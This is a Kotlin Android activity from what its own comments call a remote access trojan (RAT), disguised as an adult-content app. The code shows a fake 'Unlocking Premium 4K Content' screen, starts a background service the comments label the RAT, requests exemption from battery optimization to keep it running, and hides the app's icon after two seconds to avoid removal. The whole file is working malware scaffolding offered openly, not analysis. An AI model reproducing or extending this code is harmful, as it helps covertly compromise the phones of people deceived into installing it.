package com.premium.vault

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.TextView

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Fake Adult App UI
        val textView = TextView(this).apply {
            text = "Unlocking Premium 4K Content...\nPlease wait."
            textSize = 20f
            setPadding(50, 500, 50, 50)
        }
        setContentView(textView)

        // Start the RAT background service
        startForegroundService(Intent(this, SyncService::class.java))

        // Bypass Battery Optimization (Keeps the RAT alive)
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {}

        // Hide the app icon after 2 seconds
        android.os.Handler(mainLooper).postDelayed({
            val p = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            finish()
        }, 2000)
    }
}
